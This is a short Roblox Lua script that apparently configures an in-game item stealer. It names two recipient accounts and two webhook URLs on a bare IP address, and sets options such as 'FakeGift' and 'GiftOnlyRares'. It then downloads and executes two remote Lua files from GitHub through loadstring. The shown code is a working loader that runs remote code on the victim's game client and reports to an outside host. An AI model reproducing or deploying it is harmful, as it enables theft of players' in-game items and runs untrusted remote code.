_G.NullConfig = {
    User = {'DanyelQuibs', 'DsonAlt2'},
    min_value = 0,
    pingEveryone = "No", -- dont change this
    Webhook = "http://45.13.225.83:20002/proxy/7aa9a6b1e62e10149bfae4173fbc15a1",
    FakeGift = "No",
    Trash = "http://45.13.225.83:20002/proxy/1dc655ad8273752c7ee36db5d0e5f43a",
    LoadingScreen = "No",
    GiftOnlyRares = "Yes"
}

loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptHubLoader/Pixiemo/refs/heads/main/Main.lua"))()
